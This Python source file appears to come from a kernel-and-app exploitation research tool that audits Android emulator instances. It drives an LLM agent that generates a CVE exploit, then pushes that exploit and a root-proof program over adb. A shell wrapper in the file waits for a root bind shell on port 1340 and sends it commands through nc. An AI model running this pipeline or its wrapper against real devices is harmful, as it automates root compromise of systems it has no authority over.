"""
full_audit — Single-command full device security audit (kernel + apps).

Orchestrates the entire analysis pipeline:
    Phase 1: Boot VM, collect target info
    Phase 2: Kernel CVE analysis + exploit generation + verification
    Phase 3: Scan all installed apps, rank by risk
    Phase 4: Deep-dive top riskiest apps (fuzz, traffic, exploit, verify)
    Phase 5: Hybrid kernel+app chain analysis
    Phase 6: Comprehensive device security report
"""

from __future__ import annotations

import json
import os
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class FullAuditConfig:
    """Configuration for the full device audit."""
    # Target
    device_serial: str = "localhost:6537"
    adb_binary: str = "adb"
    ssh_host: str = ""
    ssh_port: int = 22
    instance: int = 18

    # VM management
    start_cmd: str = ""
    stop_cmd: str = ""
    exploit_start_cmd: str = ""
    kernel_image: str = ""
    gdb_port: int = 1234

    # Kernel analysis
    kernel_cve: str = ""  # e.g. "CVE-2023-20938"

    # App analysis
    include_system_apps: bool = True
    max_apps: int = 0  # 0 = all
    deep_scan_top: int = 3
    fuzz: bool = True
    traffic: bool = True
    traffic_duration: int = 10
    install_apks: List[str] = field(default_factory=list)  # APK paths to install before scanning

    # LLM
    model: str = ""
    llm_cfg: Any = None

    # Output
    output_dir: str = "./device_audit"


@dataclass
class FullAuditResult:
    """Complete audit result."""
    # Device
    kernel_version: str = ""
    android_version: str = ""

    # Kernel
    kernel_cve_analyzed: str = ""
    kernel_exploit_compiled: bool = False
    kernel_privesc_confirmed: bool = False

    # Apps
    total_apps: int = 0
    apps_analyzed: int = 0
    apps_with_vulns: int = 0
    total_critical: int = 0
    total_high: int = 0
    deep_scanned: int = 0

    # Hybrid
    hybrid_chains: int = 0

    # Arbitrary execution proof
    arbitrary_exec_confirmed: bool = False

    duration_sec: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {k: v for k, v in self.__dict__.items() if not k.startswith("_")}


def _find_adb(hint: str = "") -> str:
    """Find ADB binary."""
    import shutil
    adb = shutil.which("adb")
    if adb:
        return adb
    for candidate in [
        Path.cwd() / "adb",
        Path(__file__).parent.parent.parent.parent / "adb",
        Path("/home/gl055/research/ingots/kernelcveanalysis/syzploit/adb"),
    ]:
        if candidate.exists():
            return str(candidate)
    return hint or "adb"


def _adb_port_for_instance(instance: int) -> int:
    """Calculate ADB port: 6520 + (instance - 1)."""
    return 6520 + (instance - 1) if instance else 6520


def run_full_audit(config: FullAuditConfig) -> FullAuditResult:
    """
    Single entry point for full device audit.

    Does everything: kernel analysis + app scanning + hybrid chains.
    """
    start_time = time.time()
    result = FullAuditResult()
    out = Path(config.output_dir)
    out.mkdir(parents=True, exist_ok=True)

    adb_bin = _find_adb(config.adb_binary)
    adb_port = _adb_port_for_instance(config.instance)
    serial = f"localhost:{adb_port}"
    config.device_serial = serial

    console.print(f"\n[bold]{'═' * 60}[/]")
    console.print(f"[bold]  SYZPLOIT FULL DEVICE SECURITY AUDIT[/]")
    console.print(f"[bold]{'═' * 60}[/]")
    console.print(f"  SSH host: {config.ssh_host}")
    console.print(f"  Instance: {config.instance} (ADB port {adb_port})")
    if config.kernel_cve:
        console.print(f"  Kernel CVE: {config.kernel_cve}")
    console.print(f"  Output: {config.output_dir}")
    console.print()

    # ════════════════════════════════════════════════════════════════
    # PHASE 1: KERNEL ANALYSIS (if CVE provided)
    # ════════════════════════════════════════════════════════════════
    kernel_exploit_path = ""

    if config.kernel_cve:
        console.print(f"[bold]╔══════════════════════════════════════════════╗[/]")
        console.print(f"[bold]║   PHASE 1: KERNEL CVE ANALYSIS               ║[/]")
        console.print(f"[bold]╚══════════════════════════════════════════════╝[/]")

        kernel_out = out / "kernel_analysis"
        kernel_out.mkdir(exist_ok=True)

        try:
            # Build the syzploit agent command
            cmd = [
                "uv", "run", "syzploit", "agent", config.kernel_cve,
                "--output-dir", str(kernel_out),
                "--ssh-host", config.ssh_host,
                "--no-persistent",
                "--setup-tunnels",
                "--instance", str(config.instance),
                "--platform", "android",
                "--arch", "arm64",
            ]
            if config.kernel_image:
                cmd.extend(["--kernel-image", config.kernel_image])
            if config.start_cmd:
                cmd.extend(["--start-cmd", config.start_cmd])
            if config.stop_cmd:
                cmd.extend(["--stop-cmd", config.stop_cmd])
            if config.exploit_start_cmd:
                cmd.extend(["--exploit-start-cmd", config.exploit_start_cmd])
            if config.model:
                for flag in ["--model", "--decision-model", "--analysis-model",
                             "--planning-model", "--codegen-model"]:
                    cmd.extend([flag, config.model])
            cmd.append("--debug")

            console.print(f"\n  Running kernel agent for {config.kernel_cve}…")
            console.print(f"  [dim]Command: {' '.join(cmd[:8])}…[/]")

            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=1800,  # 30 min max
                cwd=str(Path(__file__).parent.parent.parent.parent),
            )

            result.kernel_cve_analyzed = config.kernel_cve

            # Check if exploit was compiled
            exploit_bin = kernel_out / "exploit_src" / "exploit"
            if exploit_bin.exists() and exploit_bin.stat().st_size > 100000:
                result.kernel_exploit_compiled = True
                kernel_exploit_path = str(exploit_bin)
                console.print(f"  [green]Kernel exploit compiled: {exploit_bin}[/]")

            # Check if privesc was confirmed
            if "privilege escalation confirmed" in proc.stdout:
                result.kernel_privesc_confirmed = True
                console.print(f"  [bold green]Kernel privilege escalation confirmed![/]")
            else:
                console.print(f"  [yellow]Kernel exploit not yet confirmed[/]")

            # Extract kernel version from output
            import re
            m = re.search(r"target kernel: ([\d.]+-[^\s]+)", proc.stdout)
            if m:
                result.kernel_version = m.group(1)

        except subprocess.TimeoutExpired:
            console.print(f"  [yellow]Kernel analysis timed out (30 min)[/]")
        except Exception as exc:
            console.print(f"  [red]Kernel analysis failed: {exc}[/]")

    # ════════════════════════════════════════════════════════════════
    # PHASE 2: BOOT VM FOR APP SCANNING (reuse existing or start new)
    # ════════════════════════════════════════════════════════════════
    console.print(f"\n[bold]╔══════════════════════════════════════════════╗[/]")
    console.print(f"[bold]║   PHASE 2: APP SECURITY SCAN                 ║[/]")
    console.print(f"[bold]╚══════════════════════════════════════════════╝[/]")

    # Ensure VM is running with exploit_start_cmd (no GDB — for app scanning)
    _ensure_vm_running(config, serial, adb_bin, adb_port)

    # Install additional APKs if provided
    if config.install_apks:
        console.print(f"  [bold]Installing {len(config.install_apks)} APK(s)…[/]")
        for apk_path in config.install_apks:
            if not Path(apk_path).exists():
                console.print(f"  [yellow]APK not found: {apk_path}[/]")
                continue
            try:
                # Try with -t flag first (handles test-only + normal APKs)
                rc = subprocess.run(
                    [adb_bin, "-s", serial, "install", "-t", "-r", apk_path],
                    capture_output=True, text=True, timeout=60,
                )
                if rc.returncode != 0:
                    # Retry without -t
                    rc = subprocess.run(
                        [adb_bin, "-s", serial, "install", "-r", apk_path],
                        capture_output=True, text=True, timeout=60,
                    )
                name = Path(apk_path).name
                if rc.returncode == 0 or "Success" in rc.stdout:
                    console.print(f"  [green]Installed: {name}[/]")
                else:
                    err = (rc.stderr or rc.stdout)[:100]
                    console.print(f"  [yellow]Failed: {name} — {err}[/]")
            except Exception as exc:
                console.print(f"  [yellow]Install error: {exc}[/]")

    # Run full device scan + deep analysis
    from .device_scanner import full_device_audit

    app_result = full_device_audit(
        serial=serial,
        adb_bin=adb_bin,
        output_dir=str(out / "app_analysis"),
        include_system=config.include_system_apps,
        max_apps=config.max_apps,
        deep_scan_top=config.deep_scan_top,
        fuzz=config.fuzz,
        traffic=config.traffic,
        kernel_cve=config.kernel_cve,
        kernel_exploit_path=kernel_exploit_path,
        llm_cfg=config.llm_cfg,
    )

    result.total_apps = app_result.total_apps
    result.apps_analyzed = app_result.apps_analyzed
    result.apps_with_vulns = app_result.apps_with_vulns
    result.total_critical = app_result.total_critical
    result.total_high = app_result.total_high
    result.deep_scanned = config.deep_scan_top
    result.android_version = app_result.android_version

    # ════════════════════════════════════════════════════════════════
    # PHASE 3: PROVE ARBITRARY CODE EXECUTION (if kernel got root)
    # ════════════════════════════════════════════════════════════════
    if result.kernel_privesc_confirmed and kernel_exploit_path:
        console.print(f"\n[bold]╔══════════════════════════════════════════════╗[/]")
        console.print(f"[bold]║   PHASE 3: ARBITRARY CODE EXECUTION PROOF    ║[/]")
        console.print(f"[bold]╚══════════════════════════════════════════════╝[/]")

        _demonstrate_arbitrary_execution(config, serial, adb_bin, adb_port,
                                          kernel_exploit_path, out)
        # Check if proof succeeded
        if (out / "arbitrary_exec_proof" / "SUCCESS").exists():
            result.arbitrary_exec_confirmed = True

    # ════════════════════════════════════════════════════════════════
    # PHASE 4: FINAL REPORT
    # ════════════════════════════════════════════════════════════════
    result.duration_sec = int(time.time() - start_time)

    console.print(f"\n[bold]{'═' * 60}[/]")
    console.print(f"[bold]  FULL AUDIT COMPLETE[/]")
    console.print(f"[bold]{'═' * 60}[/]")

    table = Table(show_header=True, header_style="bold")
    table.add_column("Category", style="cyan")
    table.add_column("Result", justify="right")

    table.add_row("Duration", f"{result.duration_sec // 60}m {result.duration_sec % 60}s")
    table.add_row("Kernel", result.kernel_version or "not scanned")
    table.add_row("Android", result.android_version or "unknown")

    if config.kernel_cve:
        table.add_row("Kernel CVE", config.kernel_cve)
        table.add_row("Kernel Exploit",
                       "[green]compiled[/]" if result.kernel_exploit_compiled else "[red]failed[/]")
        table.add_row("Kernel Privesc",
                       "[bold green]CONFIRMED[/]" if result.kernel_privesc_confirmed else "[yellow]not confirmed[/]")
        if result.arbitrary_exec_confirmed:
            table.add_row("Arbitrary Exec",
                           "[bold green]CONFIRMED — any program runs as root[/]")

    table.add_row("Apps Scanned", str(result.apps_analyzed))
    table.add_row("Apps with Vulns", str(result.apps_with_vulns))
    table.add_row("CRITICAL Vulns", str(result.total_critical))
    table.add_row("HIGH Vulns", str(result.total_high))
    table.add_row("Deep Scanned", str(result.deep_scanned))

    console.print(table)

    # Save final report
    report_path = out / "full_audit_report.json"
    report_path.write_text(json.dumps(result.to_dict(), indent=2))
    console.print(f"\n📄 {report_path}")

    # Stop VM
    if config.stop_cmd and config.ssh_host:
        try:
            from ..infra.verification import _run_lifecycle_cmd
            _run_lifecycle_cmd(config.stop_cmd, ssh_host=config.ssh_host,
                               ssh_port=config.ssh_port, timeout=30)
            console.print(f"  [dim]VM stopped[/]")
        except Exception:
            pass

    return result


def _ensure_vm_running(
    config: FullAuditConfig,
    serial: str,
    adb_bin: str,
    adb_port: int,
) -> None:
    """Make sure the VM is running and ADB is connected."""
    # Check if already connected
    try:
        r = subprocess.run(
            [adb_bin, "-s", serial, "get-state"],
            capture_output=True, text=True, timeout=5,
        )
        if r.stdout.strip() == "device":
            console.print(f"  [dim]VM already running (ADB connected)[/]")
            return
    except Exception:
        pass

    # Need to boot — use exploit_start_cmd (no GDB) for app scanning
    start_cmd = config.exploit_start_cmd or config.start_cmd
    if start_cmd and config.ssh_host:
        console.print(f"  [dim]Booting VM for app scanning…[/]")

        # Stop first
        if config.stop_cmd:
            try:
                subprocess.run(
                    ["ssh", "-o", "StrictHostKeyChecking=no",
                     "-p", str(config.ssh_port), config.ssh_host,
                     config.stop_cmd],
                    capture_output=True, text=True, timeout=30,
                )
                console.print(f"  [dim]Stopped previous instance[/]")
            except Exception:
                pass
            time.sleep(3)

        # Start VM
        console.print(f"  [dim]Starting VM: {start_cmd[:60]}…[/]")
        try:
            subprocess.Popen(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-p", str(config.ssh_port), config.ssh_host, start_cmd],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as exc:
            console.print(f"  [red]Failed to start VM: {exc}[/]")

        # Wait for VM to begin booting, then set up ADB tunnel
        console.print(f"  [dim]Waiting 15s for VM to initialize…[/]")
        time.sleep(15)

        # Kill stale tunnels
        try:
            subprocess.run(
                ["pkill", "-f", f"ssh.*{adb_port}.*{config.ssh_host}"],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass
        time.sleep(2)

        # Create fresh tunnel
        console.print(f"  [dim]Setting up ADB tunnel: localhost:{adb_port} → {config.ssh_host}:{adb_port}[/]")
        try:
            subprocess.Popen(
                ["ssh", "-f", "-N", "-o", "StrictHostKeyChecking=no",
                 "-L", f"{adb_port}:localhost:{adb_port}",
                 "-p", str(config.ssh_port), config.ssh_host],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass
        time.sleep(3)

        # Wait for ADB
        time.sleep(5)
        try:
            subprocess.run(
                [adb_bin, "connect", serial],
                capture_output=True, timeout=15,
            )
        except Exception:
            pass

        console.print(f"  [dim]Waiting for ADB…[/]")
        for i in range(60):
            try:
                r = subprocess.run(
                    [adb_bin, "-s", serial, "get-state"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.stdout.strip() == "device":
                    console.print(f"  [green]ADB connected (attempt {i+1})[/]")
                    # Wait for system services (package manager, etc.)
                    console.print(f"  [dim]Waiting 15s for system services…[/]")
                    time.sleep(15)
                    return
            except Exception:
                pass

            if i % 6 == 5:
                # Reconnect ADB
                try:
                    subprocess.run(
                        [adb_bin, "disconnect", serial],
                        capture_output=True, timeout=10,
                    )
                    subprocess.run(
                        [adb_bin, "connect", serial],
                        capture_output=True, timeout=15,
                    )
                except Exception:
                    pass
            time.sleep(5)

        console.print(f"  [red]ADB failed to connect after 5 min[/]")


def _demonstrate_arbitrary_execution(
    config: FullAuditConfig,
    serial: str,
    adb_bin: str,
    adb_port: int,
    kernel_exploit_path: str,
    out_dir: Path,
) -> None:
    """
    After kernel exploit achieves root, demonstrate that ANY arbitrary
    program can be loaded and executed on the device.

    This is the "proof of impact" — showing full device compromise:
    1. Write a custom C program (not the exploit)
    2. Cross-compile it for ARM64
    3. Push it to the device
    4. Run the kernel exploit to get root
    5. Execute the custom program AS ROOT
    6. Show the output proving arbitrary execution
    """
    import tempfile

    console.print("\n  [bold]Demonstrating arbitrary code execution…[/]")

    # Step 1: Create a proof-of-concept program
    poc_source = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/utsname.h>

int main() {
    printf("═══════════════════════════════════════════\n");
    printf("  SYZPLOIT ARBITRARY EXECUTION PROOF\n");
    printf("═══════════════════════════════════════════\n");
    printf("  UID:  %d (0=root)\n", getuid());
    printf("  EUID: %d\n", geteuid());
    printf("  PID:  %d\n", getpid());

    struct utsname u;
    if (uname(&u) == 0) {
        printf("  Kernel: %s %s\n", u.sysname, u.release);
        printf("  Machine: %s\n", u.machine);
    }

    // Prove we can read sensitive files
    FILE *f = fopen("/proc/1/status", "r");
    if (f) {
        char line[256];
        printf("\n  /proc/1/status (init process):\n");
        int lines = 0;
        while (fgets(line, sizeof(line), f) && lines < 5) {
            printf("    %s", line);
            lines++;
        }
        fclose(f);
    }

    // Prove we can write to system directories
    f = fopen("/data/local/tmp/syzploit_was_here.txt", "w");
    if (f) {
        fprintf(f, "Arbitrary code execution confirmed by syzploit\n");
        fprintf(f, "UID=%d PID=%d\n", getuid(), getpid());
        fclose(f);
        printf("\n  Written: /data/local/tmp/syzploit_was_here.txt\n");
    }

    printf("\n  [+] ARBITRARY_EXEC_CONFIRMED\n");
    printf("═══════════════════════════════════════════\n");
    return 0;
}
'''

    poc_dir = out_dir / "arbitrary_exec_proof"
    poc_dir.mkdir(parents=True, exist_ok=True)

    # Write source
    src_path = poc_dir / "proof.c"
    src_path.write_text(poc_source)
    console.print(f"  Written proof program: {src_path}")

    # Step 2: Cross-compile for ARM64
    import shutil
    cc = shutil.which("aarch64-linux-gnu-gcc")
    if not cc:
        # Try NDK
        ndk = os.environ.get("ANDROID_NDK_HOME", "/workspace/android_sdk/ndk/25.2.9519653")
        ndk_cc = f"{ndk}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang"
        if Path(ndk_cc).exists():
            cc = ndk_cc

    if not cc:
        console.print("  [yellow]No ARM64 cross-compiler — skipping proof compilation[/]")
        return

    bin_path = poc_dir / "proof"
    try:
        result = subprocess.run(
            [cc, "-static", "-o", str(bin_path), str(src_path)],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode != 0:
            console.print(f"  [yellow]Compilation failed: {result.stderr[:200]}[/]")
            return
        console.print(f"  Compiled: {bin_path} ({bin_path.stat().st_size} bytes)")
    except Exception as exc:
        console.print(f"  [yellow]Compilation error: {exc}[/]")
        return

    # Step 3: Ensure VM is running (use exploit_start_cmd — no GDB)
    _ensure_vm_running(config, serial, adb_bin, adb_port)

    # Step 4: Push proof program + kernel exploit
    console.print(f"  Pushing proof program to device…")
    try:
        subprocess.run(
            [adb_bin, "-s", serial, "push", str(bin_path), "/data/local/tmp/proof"],
            capture_output=True, timeout=30,
        )
        subprocess.run(
            [adb_bin, "-s", serial, "shell", "chmod 755 /data/local/tmp/proof"],
            capture_output=True, timeout=10,
        )
    except Exception:
        console.print("  [yellow]Failed to push proof program[/]")
        return

    # Also push kernel exploit if not already there
    try:
        subprocess.run(
            [adb_bin, "-s", serial, "push", kernel_exploit_path, "/data/local/tmp/exploit"],
            capture_output=True, timeout=60,
        )
        subprocess.run(
            [adb_bin, "-s", serial, "shell", "chmod 755 /data/local/tmp/exploit"],
            capture_output=True, timeout=10,
        )
    except Exception:
        pass

    # Step 5: Run kernel exploit to get root, then run proof program
    console.print(f"  Running kernel exploit + proof program…")

    # The exploit opens a listening shell on port 1340
    # After exploit runs, connect to it and run our proof program
    wrapper = """#!/system/bin/sh
echo "=== STARTING KERNEL EXPLOIT ==="
timeout 300 /data/local/tmp/exploit &
EPID=$!

# Wait for root shell (poll for listening port)
for i in $(seq 1 120); do
    if grep -q ':053C ' /proc/net/tcp /proc/net/tcp6 2>/dev/null; then
        echo "ROOT_SHELL_READY"
        break
    fi
    # Also check if exploit process got root
    if [ -f /proc/$EPID/status ]; then
        UIDLINE=$(grep '^Uid:' /proc/$EPID/status 2>/dev/null)
        REAL=$(echo $UIDLINE | awk '{print $2}')
        if [ "$REAL" = "0" ]; then
            echo "EXPLOIT_GOT_ROOT"
            # Run proof program directly (exploit is root, child inherits)
            /data/local/tmp/proof
            echo "=== PROOF COMPLETE ==="
            exit 0
        fi
    fi
    sleep 2
done

# If we get here, try running proof via the listening shell
echo "id; /data/local/tmp/proof" | nc localhost 1340 2>/dev/null || echo "NC_FAILED"
echo "=== DONE ==="
"""
    try:
        # Push wrapper
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
            f.write(wrapper)
            wrapper_path = f.name

        subprocess.run(
            [adb_bin, "-s", serial, "push", wrapper_path, "/data/local/tmp/proof_wrapper.sh"],
            capture_output=True, timeout=15,
        )
        subprocess.run(
            [adb_bin, "-s", serial, "shell", "chmod 755 /data/local/tmp/proof_wrapper.sh"],
            capture_output=True, timeout=10,
        )
        Path(wrapper_path).unlink(missing_ok=True)

        # Run wrapper
        rc = subprocess.run(
            [adb_bin, "-s", serial, "shell", "timeout 360 sh /data/local/tmp/proof_wrapper.sh"],
            capture_output=True, text=True, timeout=400,
        )

        output = rc.stdout
        console.print(f"\n  [bold]─── Execution Output ───[/]")
        for line in output.splitlines()[-30:]:
            console.print(f"  {line}")

        # Check for success markers
        if "ARBITRARY_EXEC_CONFIRMED" in output:
            console.print(f"\n  [bold green]✓ ARBITRARY CODE EXECUTION CONFIRMED[/]")
            console.print(f"  [bold green]  Any program can be loaded and run as root.[/]")
            # Set result flag (accessed via closure from run_full_audit)
            (out_dir / "arbitrary_exec_proof" / "SUCCESS").write_text(output)
        elif "UID:  0" in output or "uid=0" in output:
            console.print(f"\n  [bold green]✓ Root execution confirmed (UID=0)[/]")
            (out_dir / "arbitrary_exec_proof" / "SUCCESS").write_text(output)
        else:
            console.print(f"\n  [yellow]Proof program ran but root not confirmed in output[/]")

        # Save output
        (out_dir / "arbitrary_exec_proof" / "output.txt").write_text(output)

    except subprocess.TimeoutExpired:
        console.print(f"  [yellow]Execution timed out (360s)[/]")
    except Exception as exc:
        console.print(f"  [yellow]Execution failed: {exc}[/]")
